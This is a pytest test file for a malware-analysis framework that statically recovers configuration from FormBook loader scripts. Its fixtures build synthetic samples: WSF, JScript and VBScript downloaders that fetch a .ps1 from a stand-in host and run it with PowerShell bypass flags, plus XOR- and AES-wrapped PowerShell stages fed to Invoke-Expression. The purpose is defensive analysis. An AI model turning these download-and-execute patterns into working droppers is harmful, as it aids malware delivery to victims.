"""FormBook script loaderの自動静的復元とfail-closed動作を検証する。"""

from __future__ import annotations

import base64
import hashlib
import os
import sys
from dataclasses import replace
from pathlib import Path
from types import SimpleNamespace

import pytest
from Cryptodome.Cipher import AES

FRAMEWORK = Path(__file__).parents[1]
COMMON = FRAMEWORK / "common"
for trusted in (FRAMEWORK, COMMON):
    if str(trusted) not in sys.path:
        sys.path.insert(0, str(trusted))

from analysis_contract import handler_result_quality  # noqa: E402
import handler_catalog as handler_catalog  # noqa: E402
from handler_catalog import (  # noqa: E402
    HandlerNoEvidenceError,
    clear_handler_caches,
    discover_handlers,
    execute_handler_bounded_for_assessment,
    preflight_handler_for_assessment,
    preflight_handler_runtime_import,
)

from malware.formbook import detect as family_detector  # noqa: E402
from malware.formbook_loader import detect as detector  # noqa: E402
from malware.formbook_loader import extract_config as facade  # noqa: E402
from malware.formbook_loader import native_xloader  # noqa: E402
from malware.formbook_loader import static_chain  # noqa: E402


def _handler_spec():
    return next(
        item
        for item in discover_handlers()
        if item.family == "formbook_loader" and item.relative_path.endswith("formbook_loader/extract_config.py")
    )


def test_legacy_script_chain_handler_uses_supported_contract() -> None:
    clear_handler_caches()
    spec = next(
        item
        for item in discover_handlers()
        if item.family == "formbook_loader"
        and item.relative_path.endswith("formbook_loader/extract_script_chain.py")
    )

    assert spec.supported_interface is True
    assert spec.input_formats == ("script", "data")


def _minimal_pe(extra: bytes = b"") -> bytes:
    data = bytearray(0x200)
    data[:2] = b"MZ"
    data[0x3C:0x40] = (0x80).to_bytes(4, "little")
    data[0x80:0x84] = b"PE\0\0"
    data[0x84:0x86] = (0x14C).to_bytes(2, "little")
    data[0x86:0x88] = (1).to_bytes(2, "little")
    data[0x94:0x96] = (0xE0).to_bytes(2, "little")
    data[0x98:0x9A] = (0x10B).to_bytes(2, "little")
    return bytes(data) + extra


def _custom_encode(plaintext: str, key: str) -> str:
    encrypted = static_chain._rc4_text(plaintext, key.encode("latin-1")).encode("utf-8")
    encoded = base64.b64encode(encrypted).decode("ascii")
    return encoded.translate(
        str.maketrans(static_chain.STANDARD_BASE64_ALPHABET, static_chain.CUSTOM_BASE64_ALPHABET)
    )


def _wsf_fixture() -> bytes:
    key = "K3y!"
    values = [
        "MSXML2.XMLHTTP",
        "WScript.Shell",
        "Scripting.FileSystemObject",
        'powershell.exe -nop -ep bypass -file "',
        "GET",
        "status",
        "responseText",
        "open",
        "send",
        ".ps1",
    ]
    table = ",".join(repr(_custom_encode(value, key)) for value in values)
    calls = "\n".join(f"var v{index}=decode(0x{index:x},'{key}');" for index in range(len(values)))
    return f'''<?xml version="1.0"?>
<job><script language="JScript">
var alphabet="{static_chain.CUSTOM_BASE64_ALPHABET}";
function rc4(x,k){{for(var i=0;i<0x100;i++){{x.charCodeAt(i % 0x100);}}}}
var table=[{table}];
function download(url,retry){{retry=retry||0x2;for(var i=0;i<=retry;i++){{new ActiveXObject(v0);}}}}
{calls}
var stage="https://updates.example.test/content/secured_stub.ps1";
var http=new ActiveXObject(v0),shell=new ActiveXObject(v1),filesystem=new ActiveXObject(v2);
function transfer(target){{http[v7](v4,target,false);http[v8]();if(http[v5]===200){{return http[v6];}}return null;}}
var downloaded=transfer(stage);
</script></job>'''.encode()


def _wsf_split_literal_fixture(
    *,
    stage_url: str = "https://updates.example.test/content/secured_stub.ps1",
    extra_literals: tuple[str, ...] = (),
    extra_source: str = "",
    decoder_call_limit: int | None = None,
    decoded_values: tuple[str, ...] = (
        "WScript.Shell",
        "MSXML2.XMLHTTP",
        "open",
        "send",
        "responseText",
        "GET",
        "status",
        ".ps1",
    ),
) -> bytes:
    """28e18f02系のRC4値と平文mixed table分散を再現する。"""

    key = "K3y!"
    table = ",".join(repr(_custom_encode(value, key)) for value in decoded_values)
    call_values = (
        decoded_values
        if decoder_call_limit is None
        else decoded_values[:decoder_call_limit]
    )
    calls = "\n".join(
        f"var v{index}=decode(0x{index:x},'{key}');"
        for index in range(len(call_values))
    )
    plain_values = (
        "Scripting.FileSystemObject",
        'powershell.exe -nop -ep bypass -file "',
        "wscript.shell",
        "OPEN",
        *extra_literals,
    )
    mixed = ",".join(
        ["decode(0x0,'K3y!')", *(repr(value) for value in plain_values)]
    )
    def reference(value: str) -> str:
        return (
            f"v{decoded_values.index(value)}"
            if value in decoded_values
            else repr(f"missing-{value}")
        )

    return f'''<?xml version="1.0"?>
<job><script language="JScript">
var alphabet="{static_chain.CUSTOM_BASE64_ALPHABET}";
function rc4(x,k){{for(var i=0;i<0x100;i++){{x.charCodeAt(i % 0x100);}}}}
var table=[{table}];
var runtimeValues=[{mixed}];
function download(url,retry){{retry=retry||0x2;for(var i=0;i<=retry;i++){{new ActiveXObject(v1);}}}}
{calls}
var stage={stage_url!r};
var http=new ActiveXObject({reference("MSXML2.XMLHTTP")}),shell=new ActiveXObject({reference("WScript.Shell")}),filesystem=new ActiveXObject("Scripting.FileSystemObject");
function transfer(target){{http[{reference("open")}]({reference("GET")},target,false);http[{reference("send")}]();if(http[{reference("status")}]===200){{return http[{reference("responseText")}];}}return null;}}
var downloaded=transfer(stage);
{extra_source}
</script></job>'''.encode()


def _direct_vbscript_fixture(
    *,
    url: str = "https://updates.example.test/content/secured_stub.ps1?token=redacted#section",
) -> bytes:
    return f'''Option Explicit
Dim stageUrl, payloadPath, launchCommand
Dim fileSystem, shell, http, outputFile
stageUrl = "{url}"
Set fileSystem = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")
Set http = CreateObject("MSXML2.XMLHTTP")
payloadPath = "C:\\Temp\\fixture.ps1"
launchCommand = "powershell.exe -nop -ep bypass -file """ & payloadPath & """"
http.Open "GET", stageUrl, False
http.Send
Set outputFile = fileSystem.CreateTextFile(payloadPath, True)
outputFile.Write http.ResponseText
outputFile.Close
shell.Run launchCommand, 0, True
'''.encode()


def _direct_jscript_fixture() -> bytes:
    return b'''var stageUrl = "https://updates.example.test/content/stage.ps1";
var fileSystem = new ActiveXObject("Scripting.FileSystemObject");
var shell = new ActiveXObject("WScript.Shell");
var http = new ActiveXObject("MSXML2.XMLHTTP.6.0");
var payloadPath = "C:\\Temp\\fixture.ps1";
var launchCommand = 'powershell.exe -NoProfile -File "' + payloadPath + '"';
http.open("GET", stageUrl, false);
http.send();
var outputFile = fileSystem.CreateTextFile(payloadPath, true);
outputFile.Write(http.ResponseText);
outputFile.Close();
shell.Run(launchCommand, 0, true);
'''


def _ghosted_fixture(
    *,
    corrupt_native: bool = False,
    target_process: str = (
        "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\aspnet_compiler.exe"
    ),
) -> tuple[bytes, bytes, bytes]:
    managed = _minimal_pe(b"managed-loader")
    native = b"not-a-pe" if corrupt_native else _minimal_pe(b"native-payload")
    token = "fixture-key"
    managed_b64 = base64.b64encode(managed)
    masked = bytes(value ^ token.encode()[index % len(token)] for index, value in enumerate(managed_b64))
    array = ",".join(str(value) for value in native)
    script = f'''function Restore-MaskedContent {{
param([string]$MaskedValue,[string]$RecoveryToken)
$layerData=[Convert]::FromBase64String($MaskedValue)
for($i=0;$i-lt $layerData.Length;$i++){{$x=$layerData[$i] -bxor 1}}
}}
function Fire-AssemblyEntry {{$a=[System.Reflection.Assembly]::Load($AssemblyBlob)}}
function Start-Sentinel {{
param([int]$TickRate = 5)
$vaultKey="{token}"
$maskedBlob='{base64.b64encode(masked).decode()}'
$restoredBlob=Restore-MaskedContent -MaskedValue $maskedBlob -RecoveryToken $vaultKey
$assemblyBytes=[Convert]::FromBase64String($restoredBlob)
$targetExecutable='{target_process}'
Fire-AssemblyEntry -TypePath 'GHOSTED.EXECUTE' -EntryPoint 'LAUNCH'
[Byte[]]$payloadBytes=({array})
}}
'''.encode()
    return script, managed, native


def _wrapped_hex(data: bytes) -> str:
    encoded = data.hex()
    return "\n".join(
        encoded[index : index + 64] for index in range(0, len(encoded), 64)
    )


def _xor_hex_envelope_fixture(
    plaintext: bytes,
    *,
    named_functions: bool,
) -> bytes:
    key = bytes(range(32))
    ciphertext = bytes(
        value ^ key[index % len(key)] for index, value in enumerate(plaintext)
    )
    if not named_functions:
        return f'''$payloadHex = @'
{_wrapped_hex(ciphertext)}
'@
$keyHex = @'
{_wrapped_hex(key)}
'@
$convertHexToBytes = {{
param([string]$hexValue)
$cleanHex = ($hexValue -replace '\\s', '')
$bytes = New-Object byte[] ($cleanHex.Length / 2)
for ($i = 0; $i -lt $cleanHex.Length; $i += 2) {{
$bytes[$i / 2] = [Convert]::ToByte($cleanHex.Substring($i, 2), 16)
}}
return ,$bytes
}}
$xorEngine = {{
param([string]$hexCipherData,[byte[]]$xorKey)
$cipherBytes = & $convertHexToBytes $hexCipherData
$plainBytes = New-Object byte[] $cipherBytes.Length
for ($i = 0; $i -lt $cipherBytes.Length; $i++) {{
$keyByte = $xorKey[$i % $xorKey.Length]
$plainBytes[$i] = $cipherBytes[$i] -bxor $keyByte
}}
return [System.Text.Encoding]::UTF8.GetString($plainBytes)
}}
$preparedKey = & $convertHexToBytes $keyHex
$decryptedResult = & $xorEngine -hexCipherData $payloadHex -xorKey $preparedKey
Invoke-Expression $decryptedResult
'''.encode()

    return f'''$script:PayloadSlot = @'
{_wrapped_hex(ciphertext)}
'@
$script:KeySlot = '{key.hex()}'
function Convert-HexValue {{
param([string]$Hex)
$normalized = $Hex -replace '\\s', ''
$output = [byte[]]::new($normalized.Length / 2)
for ($i = 0; $i -lt $normalized.Length; $i += 2) {{
$output[$i / 2] = [Convert]::ToByte($normalized.Substring($i, 2), 16)
}}
return ,$output
}}
function Invoke-StreamMask {{
param([byte[]]$Data,[byte[]]$Key)
$result = [byte[]]::new($Data.Length)
for ($i = 0; $i -lt $Data.Length; $i++) {{
$result[$i] = $Data[$i] -bxor $Key[$i % $Key.Length]
}}
return ,$result
}}
function Get-PlainStage {{
$cipherBytes = Convert-HexValue -Hex $script:PayloadSlot
$keyBytes = Convert-HexValue -Hex $script:KeySlot
$plainBytes = Invoke-StreamMask -Data $cipherBytes -Key $keyBytes
return [Text.Encoding]::UTF8.GetString($plainBytes)
}}
$decodedStage = Get-PlainStage
[ScriptBlock]::Create($decodedStage).Invoke()
'''.encode()


def _aes_fixture(plaintext: bytes) -> bytes:
    key = bytes(range(32))
    vector = bytes(range(16))
    padding = 16 - len(plaintext) % 16
    ciphertext = AES.new(key, AES.MODE_CBC, vector).encrypt(plaintext + bytes([padding]) * padding)
    return f'''$State = @{{
PayloadRaw = @'
{base64.b64encode(ciphertext).decode()}
'@
KeyRaw = @'
{base64.b64encode(key).decode()}
'@
VectorRaw = @'
{base64.b64encode(vector).decode()}
'@
}}
function ConvertFrom-FlatBase64 {{$x=[Convert]::FromBase64String($flat)}}
$managed.Mode=[System.Security.Cryptography.CipherMode]::CBC
$managed.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7
$block=[ScriptBlock]::Create($State.PlainText)
'''.encode()


def _resource_map_aes_fixture(plaintext: bytes) -> bytes:
    key = bytes(range(32))
    vector = bytes(range(16))
    padding = 16 - len(plaintext) % 16
    ciphertext = AES.new(key, AES.MODE_CBC, vector).encrypt(
        plaintext + bytes([padding]) * padding
    )
    return f'''$ResourceMap = [ordered]@{{
    'Payload' = @'
{base64.b64encode(ciphertext).decode()}
'@
    'Key' = @'
{base64.b64encode(key).decode()}
'@
    'Vector' = @'
{base64.b64encode(vector).decode()}
'@
}}
function Step-Decode {{
param([string]$Compact)
return ,([Convert]::FromBase64String($Compact))
}}
function Step-Decrypt {{
param([byte[]]$Cipher,[byte[]]$Key,[byte[]]$Vector)
$engine=[System.Security.Cryptography.AesCryptoServiceProvider]::new()
$engine.Mode=[System.Security.Cryptography.CipherMode]::CBC
$engine.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7
}}
function Step-Invoke {{ param([string]$Code); [ScriptBlock]::Create($Code) }}
foreach ($name in $ResourceMap.Keys) {{
$bytes=Step-Decode -Compact $clean
$result[$name]=$bytes
}}
$result.Plaintext=Step-Decrypt -Cipher $result['Payload'] -Key $result['Key'] -Vector $result['Vector']
$result.Executed=Step-Invoke -Code $result.Plaintext
'''.encode()


def _named_flow_aes_fixture(plaintext: bytes) -> bytes:
    """任意名のhere-stringをdecoderとAES引数まで接続したfixtureを作る。"""

    key = bytes(range(32))
    vector = bytes(range(16))
    padding = 16 - len(plaintext) % 16
    ciphertext = AES.new(key, AES.MODE_CBC, vector).encrypt(
        plaintext + bytes([padding]) * padding
    )
    return f'''$sealedContent = @'
{base64.b64encode(ciphertext).decode()}
'@
$secretMaterial = @'
{base64.b64encode(key).decode()}
'@
$startingBlock = @'
{base64.b64encode(vector).decode()}
'@
function Decode-Compact {{
param([string]$Value)
return [Convert]::FromBase64String(($Value -replace '\\s',''))
}}
function Open-SealedContent {{
param([byte[]]$InputBytes,[byte[]]$KeyBytes,[byte[]]$VectorBytes)
$engine=New-Object System.Security.Cryptography.AesManaged
$engine.Key=$KeyBytes
$engine.IV=$VectorBytes
$engine.Mode=[System.Security.Cryptography.CipherMode]::CBC
$engine.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7
$decryptor=$engine.CreateDecryptor()
$stream=New-Object System.IO.MemoryStream
$crypto=New-Object System.Security.Cryptography.CryptoStream($stream,$decryptor,[System.Security.Cryptography.CryptoStreamMode]::Write)
$crypto.Write($InputBytes,0,$InputBytes.Length)
}}
function Start-Wrapper {{
$decodedContent=Decode-Compact -Value $sealedContent
$decodedKey=Decode-Compact -Value $secretMaterial
$decodedVector=Decode-Compact -Value $startingBlock
$plainText=Open-SealedContent -InputBytes $decodedContent -KeyBytes $decodedKey -VectorBytes $decodedVector
return $plainText
}}
$wrapperResult=Start-Wrapper
$executionResult=Invoke-Expression $wrapperResult
'''.encode()


def _reviewed_dotnet_fixture(monkeypatch: pytest.MonkeyPatch) -> tuple[bytes, bytes]:
    parent = _minimal_pe(b"reviewed-loader")
    child = _minimal_pe(b"managed-child")
    derived = hashlib.pbkdf2_hmac("sha1", facade.PASSWORD_BYTES, facade.SALT, 1000, dklen=48)
    padding = 16 - len(child) % 16
    encrypted = AES.new(derived[:32], AES.MODE_CBC, derived[32:]).encrypt(
        child + bytes([padding]) * padding
    )
    monkeypatch.setattr(facade, "PARENT_SHA256", hashlib.sha256(parent).hexdigest())
    monkeypatch.setattr(facade, "ENCRYPTED_SHA256", hashlib.sha256(encrypted).hexdigest())
    monkeypatch.setattr(facade, "CHILD_SHA256", hashlib.sha256(child).hexdigest())
    monkeypatch.setattr(facade, "_resource_value", lambda _data: encrypted)
    return parent, child


def test_wsf_recovers_stage_locator_command_and_retry_without_family_claim() -> None:
    data = _wsf_fixture()
    result = facade.extract_config(data)

    assert result["variant"] == "wsf_rc4_downloader"
    assert result["static_stage_locator_recovered"] is True
    assert result["urls"] == [
        {
            "url": "https://updates.example.test/content/secured_stub.ps1",
            "role": "payload_stage",
            "query_present": False,
            "fragment_removed": False,
        }
    ]
    assert result["process_command_templates"] == ['powershell.exe -nop -ep bypass -file "']
    assert result["retry_attempts"] == 3
    assert result["supports_family_attribution"] is False
    assert result["terminal_family_confirmed"] is False
    quality = handler_result_quality(result, minimum_score=facade.HANDLER_CONTRACT["minimum_evidence_score"])
    assert quality["sufficient"] is True
    assert quality["tier_name"] == "validated_static_stage_locator"


def test_wsf_unions_plain_mixed_table_and_rc4_values_case_insensitively() -> None:
    """28e18f02系の分散文字列からrouteだけを自動復元する。"""

    result = facade.extract_config(_wsf_split_literal_fixture())

    assert result["variant"] == "wsf_rc4_downloader"
    assert result["urls"] == [
        {
            "url": "https://updates.example.test/content/secured_stub.ps1",
            "role": "payload_stage",
            "query_present": False,
            "fragment_removed": False,
        }
    ]
    assert result["process_command_templates"] == [
        'powershell.exe -nop -ep bypass -file "'
    ]
    assert result["automation_objects"] == [
        "MSXML2.XMLHTTP",
        "Scripting.FileSystemObject",
        "WScript.Shell",
    ]
    assert result["valid_rc4_call_count"] >= 3
    assert result["literal_table_count"] == 2
    assert result["literal_table_entry_count"] > result["decoded_string_count"]
    assert result["correlated_string_count"] < (
        result["literal_table_entry_count"] + result["decoded_string_count"]
    )
    assert result["static_stage_locator_recovered"] is True
    assert result["static_config_recovered"] is False
    assert result["supports_family_attribution"] is False
    assert result["terminal_family_confirmed"] is False
    assert result["c2"] == []
    assert result["executed_sample"] is False
    assert result["network_contacted"] is False


@pytest.mark.parametrize(
    ("fixture", "reason"),
    [
        (
            _wsf_split_literal_fixture(
                extra_source=(
                    'var mirror="https://mirror.example.test/content/other.ps1";'
                    "transfer(mirror);"
                )
            ),
            "URLが一意な静的dataflow",
        ),
        (
            _wsf_split_literal_fixture(
                stage_url="https://user:secret@updates.example.test/other.ps1"
            ),
            "authority",
        ),
        (
            _wsf_split_literal_fixture(
                stage_url="https://updates.example.test/a/../other.ps1"
            ),
            "path",
        ),
        (
            _wsf_split_literal_fixture(
                stage_url="https://updates.example.test/a/%2e%2e/other.ps1"
            ),
            "path",
        ),
        (
            _wsf_split_literal_fixture(
                stage_url="ftp://updates.example.test/other.ps1",
                extra_source=(
                    'var classificationAnchor="https://safe.example.test/anchor.ps1";'
                ),
            ),
            "scheme",
        ),
        (
            _wsf_split_literal_fixture(
                stage_url="https://updates.example.test/a/\x01other.ps1"
            ),
            "制御文字",
        ),
        (
            _wsf_split_literal_fixture(
                extra_literals=('powershell.exe -NoProfile -file "',)
            ),
            "templateが一意",
        ),
    ],
)
def test_wsf_split_table_ambiguity_and_unsafe_urls_fail_closed(
    fixture: bytes,
    reason: str,
) -> None:
    with pytest.raises(HandlerNoEvidenceError, match=reason):
        facade.extract_config(fixture)


def test_wsf_unrelated_stage_literal_does_not_replace_proven_open_dataflow() -> None:
    result = facade.extract_config(
        _wsf_split_literal_fixture(
            extra_source=(
                'var unrelated="https://mirror.example.test/content/other.ps1";'
            )
        )
    )

    assert result["urls"][0]["url"] == (
        "https://updates.example.test/content/secured_stub.ps1"
    )
    assert result["static_http_dataflow"]["proof"] == (
        "same_xmlhttp_object_open_send_status_response"
    )


def test_wsf_transitive_object_member_url_and_async_aliases_are_resolved() -> None:
    fixture = _wsf_split_literal_fixture().replace(
        b"function transfer(target){http[v2](v5,target,false);http[v3]();"
        b"if(http[v6]===200){return http[v4];}return null;}",
        b"var httpAlias1=http,httpAlias2=httpAlias1;"
        b"function transfer(target){var urlAlias1=target,urlAlias2=urlAlias1,"
        b"openAlias1=v2,openAlias2=openAlias1,asyncFlag=false;"
        b"httpAlias2[openAlias2](v5,urlAlias2,asyncFlag);httpAlias2[v3]();"
        b"if(httpAlias2[v6]===200){return httpAlias2[v4];}return null;}",
    )

    result = facade.extract_config(fixture)

    assert result["urls"][0]["url"] == (
        "https://updates.example.test/content/secured_stub.ps1"
    )
    assert result["static_http_dataflow"]["synchronous"] is True
    assert result["c2"] == []
    assert result["terminal_family_confirmed"] is False


@pytest.mark.parametrize(
    ("old", "new", "reason"),
    [
        (
            b"http[v2](v5,target,false);",
            b"var first=second,second=first;http[first](v5,target,false);",
            "循環",
        ),
        (
            b"http[v2](v5,target,false);",
            b"http[v2](v5,target,runtimeFlag);",
            "async引数",
        ),
        (
            b"var downloaded=transfer(stage);",
            b"var downloaded=transfer(resolveAtRuntime());",
            "URLが一意な静的dataflow",
        ),
    ],
)
def test_wsf_dynamic_cyclic_or_unresolved_dataflow_fails_closed(
    old: bytes,
    new: bytes,
    reason: str,
) -> None:
    fixture = _wsf_split_literal_fixture().replace(old, new)

    with pytest.raises(HandlerNoEvidenceError, match=reason):
        facade.extract_config(fixture)


def test_wsf_send_on_a_different_xmlhttp_object_fails_closed() -> None:
    fixture = _wsf_split_literal_fixture().replace(
        b"var http=new ActiveXObject(v1),shell=",
        b"var http=new ActiveXObject(v1),otherHttp=new ActiveXObject(v1),shell=",
    ).replace(b"http[v3]();", b"otherHttp[v3]();")

    with pytest.raises(HandlerNoEvidenceError, match="COM objectが一意"):
        facade.extract_config(fixture)


def test_wsf_split_table_requires_all_network_and_launch_evidence() -> None:
    missing_response = _wsf_split_literal_fixture(
        decoded_values=(
            "WScript.Shell",
            "MSXML2.XMLHTTP",
            "open",
            "send",
            "GET",
            "status",
            "random",
            ".ps1",
        )
    )
    with pytest.raises(HandlerNoEvidenceError, match="responseText"):
        facade.extract_config(missing_response)

    too_few_rc4 = _wsf_split_literal_fixture(decoder_call_limit=2)
    with pytest.raises(HandlerNoEvidenceError, match="table呼出が不足"):
        facade.extract_config(too_few_rc4)


def test_wsf_split_table_enforces_array_entry_and_literal_limits() -> None:
    too_many_arrays = _wsf_split_literal_fixture(
        extra_source="\n".join(
            f"var extra{index}=['x'];"
            for index in range(static_chain.MAX_WSF_ARRAY_COUNT)
        )
    )
    with pytest.raises(HandlerNoEvidenceError, match="table数が上限"):
        facade.extract_config(too_many_arrays)

    too_many_entries = _wsf_split_literal_fixture(
        extra_source=(
            "var extra=["
            + ",".join("'x'" for _ in range(static_chain.MAX_STRING_TABLE_ENTRIES))
            + "];"
        )
    )
    with pytest.raises(HandlerNoEvidenceError, match="総entry数が上限"):
        facade.extract_config(too_many_entries)

    oversized_literal = _wsf_split_literal_fixture(
        extra_literals=("A" * (static_chain.MAX_STRING_LENGTH + 1),)
    )
    with pytest.raises(HandlerNoEvidenceError, match="literalが上限"):
        facade.extract_config(oversized_literal)


def test_wsf_split_table_enforces_total_character_limit() -> None:
    literals = tuple(
        f"{index:04d}" + "A" * (static_chain.MAX_STRING_LENGTH - 4)
        for index in range(
            static_chain.MAX_WSF_LITERAL_CHARACTERS
            // static_chain.MAX_STRING_LENGTH
            + 1
        )
    )
    fixture = _wsf_split_literal_fixture(extra_literals=literals)

    with pytest.raises(HandlerNoEvidenceError, match="総文字数が上限"):
        facade.extract_config(fixture)


def test_wsf_failure_reason_survives_bounded_component_worker() -> None:
    ambiguous = _wsf_split_literal_fixture(
        extra_source=(
            'var mirror="https://mirror.example.test/other.ps1";'
            "transfer(mirror);"
        )
    )
    bounded = execute_handler_bounded_for_assessment(
        _handler_spec(),
        ambiguous,
        "ambiguous.wsf",
        actual_format="script",
        timeout_seconds=60.0,
    )

    assert bounded["status"] == "completed", bounded
    result = bounded["execution"]["result"]
    assert result["status"] == "not_applicable"
    assert "静的復元が部分的に失敗" in result["reason"]
    assert "URLが一意" in result["reason"]
    assert bounded["execution"]["executed_sample"] is False
    assert bounded["execution"]["network_contacted"] is False


def test_direct_vbscript_recovers_sanitized_stage_locator_as_route_only() -> None:
    result = facade.extract_config(_direct_vbscript_fixture())

    assert result["variant"] == "wsh_direct_http_powershell_downloader"
    assert result["static_stage_locator_recovered"] is True
    assert result["urls"] == [
        {
            "url": "https://updates.example.test/content/secured_stub.ps1",
            "role": "payload_stage",
            "query_present": True,
            "fragment_removed": True,
        }
    ]
    assert result["process_command_templates"] == [
        "powershell.exe -file <downloaded_script>"
    ]
    assert result["automation_objects"] == [
        "MSXML2.XMLHTTP",
        "Scripting.FileSystemObject",
        "WScript.Shell",
    ]
    assert result["script_language"] == "VBScript"
    assert result["response_write_flow"] == (
        "xmlhttp_response_text_to_created_text_file"
    )
    assert result["supports_family_attribution"] is False
    assert result["terminal_family_confirmed"] is False
    assert result["static_config_recovered"] is False
    assert result["c2"] == []
    quality = handler_result_quality(
        result,
        minimum_score=facade.HANDLER_CONTRACT["minimum_evidence_score"],
    )
    assert quality["sufficient"] is True
    assert quality["tier_name"] == "validated_static_stage_locator"


def test_direct_jscript_uses_same_bounded_dataflow_route() -> None:
    result = facade.extract_config(_direct_jscript_fixture())

    assert result["variant"] == "wsh_direct_http_powershell_downloader"
    assert result["script_language"] == "JScript"
    assert result["urls"][0]["url"] == (
        "https://updates.example.test/content/stage.ps1"
    )
    assert result["automation_objects"][0] == "MSXML2.XMLHTTP.6.0"
    assert result["executed_sample"] is False
    assert result["network_contacted"] is False


def test_direct_wsh_ambiguous_url_and_broken_response_flow_fail_closed() -> None:
    ambiguous = _direct_jscript_fixture().replace(
        b'http.open("GET", stageUrl, false);',
        b'http.open("GET", stageUrl, false);\n'
        b'http.open("GET", "https://mirror.example.test/other.ps1", false);',
    )
    with pytest.raises(HandlerNoEvidenceError, match="URLが一意"):
        facade.extract_config(ambiguous)

    broken_flow = _direct_jscript_fixture().replace(
        b"outputFile.Write(http.ResponseText);",
        b"outputFile.Write(otherHttp.ResponseText);",
    )
    with pytest.raises(HandlerNoEvidenceError, match="同じtext file"):
        facade.extract_config(broken_flow)


def test_direct_wsh_rejects_url_userinfo() -> None:
    with pytest.raises(HandlerNoEvidenceError, match="authority"):
        facade.extract_config(
            _direct_vbscript_fixture(
                url="https://user:secret@updates.example.test/stage.ps1"
            )
        )


def test_aes_envelope_recovers_nonterminal_pe_for_follow_on() -> None:
    ghosted, managed, native = _ghosted_fixture()
    result = facade.extract_config(_aes_fixture(ghosted))

    assert result["variant"] == "powershell_aes_to_ghosted_payload"
    assert result["terminal_payload_recovered"] is False
    assert result["derived_payload_recovered"] is True
    assert result["recovered_artifacts"][0]["size"] == len(managed)
    assert result["recovered_artifacts"][1]["size"] == len(native)
    assert result["recovered_payload"]["role"] == "recovered_payload"
    assert result["recovered_payload"]["data"] == native
    assert result["target_process"].endswith("aspnet_compiler.exe")
    assert result["watch_interval_seconds"] == 5
    assert result["supports_family_attribution"] is False


@pytest.mark.parametrize("named_functions", [False, True])
def test_repeating_xor_hex_envelope_recovers_ghosted_follow_on_fail_closed(
    named_functions: bool,
) -> None:
    ghosted, managed, native = _ghosted_fixture()
    envelope = _xor_hex_envelope_fixture(
        ghosted,
        named_functions=named_functions,
    )

    result = facade.extract_config(envelope)

    assert result["variant"] == "powershell_repeating_xor_to_ghosted_payload"
    assert result["terminal_payload_recovered"] is False
    assert result["derived_payload_recovered"] is True
    assert result["recovered_artifacts"][0]["size"] == len(managed)
    assert result["recovered_artifacts"][1]["size"] == len(native)
    assert result["recovered_payload"]["role"] == "recovered_payload"
    assert result["recovered_payload"]["data"] == native
    assert result["encrypted_stage"] == {
        "scheme": "hex_repeating_key_xor",
        "sha256": hashlib.sha256(envelope).hexdigest(),
        "decrypted_sha256": hashlib.sha256(ghosted).hexdigest(),
        "decrypted_size": len(ghosted),
        "content_exported": False,
        "key_material_exported": False,
    }
    assert "indexed_repeating_key_xor" in result["matched_patterns"]
    assert result["supports_family_attribution"] is False
    assert result["terminal_family_confirmed"] is False
    assert result["static_config_recovered"] is False
    assert result["c2"] == []


def test_repeating_xor_wrong_key_and_ambiguous_call_sites_fail_closed() -> None:
    ghosted, _managed, _native = _ghosted_fixture()
    envelope = _xor_hex_envelope_fixture(ghosted, named_functions=False)
    damaged_key = bytes(reversed(range(32))).hex().encode()
    wrong_key = envelope.replace(bytes(range(32)).hex().encode(), damaged_key, 1)
    with pytest.raises(HandlerNoEvidenceError, match="UTF-8|GHOSTED"):
        facade.extract_config(wrong_key)

    second_ciphertext = bytes(
        value ^ 0xA5 for value in ghosted
    ).hex()
    second_key = (bytes([0xA5]) * 32).hex()
    extra = f'''$secondPayload = '{second_ciphertext}'
$secondKey = '{second_key}'
$secondPrepared = & $convertHexToBytes $secondKey
$secondResult = & $xorEngine -hexCipherData $secondPayload -xorKey $secondPrepared
'''.encode()
    ambiguous = envelope.replace(
        b"Invoke-Expression $decryptedResult",
        extra + b"Invoke-Expression $decryptedResult",
    )
    with pytest.raises(HandlerNoEvidenceError, match="一意"):
        facade.extract_config(ambiguous)


def test_resource_map_aes_envelope_recovers_nonterminal_pe_in_memory() -> None:
    """ordered map型のPayload/Key/Vectorもdataflow検証後に復号する。"""

    ghosted, managed, native = _ghosted_fixture()
    result = facade.extract_config(_resource_map_aes_fixture(ghosted))

    assert result["variant"] == "powershell_aes_to_ghosted_payload"
    assert result["terminal_payload_recovered"] is False
    assert result["recovered_artifacts"][0]["size"] == len(managed)
    assert result["recovered_artifacts"][1]["size"] == len(native)
    assert result["recovered_payload"]["data"] == native
    assert "aes_material_triplet" in result["matched_patterns"]


def test_named_aes_dataflow_recovers_nonterminal_pe_in_memory() -> None:
    """固定変数名に依存せずBase64→AES引数dataflowから3素材を復元する。"""

    ghosted, managed, native = _ghosted_fixture()
    result = facade.extract_config(_named_flow_aes_fixture(ghosted))

    assert result["variant"] == "powershell_aes_to_ghosted_payload"
    assert result["terminal_payload_recovered"] is False
    assert result["recovered_artifacts"][0]["size"] == len(managed)
    assert result["recovered_artifacts"][1]["size"] == len(native)
    assert result["recovered_payload"]["data"] == native
    assert "decrypted_script_invocation" in result["matched_patterns"]


def test_direct_ghosted_layer_is_supported_and_cli_view_removes_bytes() -> None:
    ghosted, _managed, native = _ghosted_fixture()
    result = facade.extract_config(ghosted)
    public = facade._public_result(result)

    assert result["variant"] == "powershell_ghosted_payload"
    assert result["terminal_payload_recovered"] is False
    assert result["recovered_payload"]["data"] == native
    assert public["recovered_payload"]["data"] == {
        "content_exported": False,
        "sha256": result["recovered_artifacts"][1]["sha256"],
        "size": len(native),
    }


def test_direct_ghosted_accepts_unique_reviewed_windows_target_process() -> None:
    target = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\caspol.exe"
    ghosted, _managed, _native = _ghosted_fixture(target_process=target)

    result = facade.extract_config(ghosted)

    assert result["target_process"] == target
    assert "sacrificial_process" in result["matched_patterns"]
    assert result["supports_family_attribution"] is False
    assert result["terminal_family_confirmed"] is False


def test_reviewed_dotnet_child_enters_fixed_point_without_terminal_family_claim(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    parent, child = _reviewed_dotnet_fixture(monkeypatch)
    result = facade.extract_config(parent)
    digest = hashlib.sha256(child).hexdigest()

    assert result["family"] == "formbook_loader"
    assert result["derived_payload_recovered"] is True
    assert result["terminal_payload_recovered"] is False
    assert result["supports_family_attribution"] is False
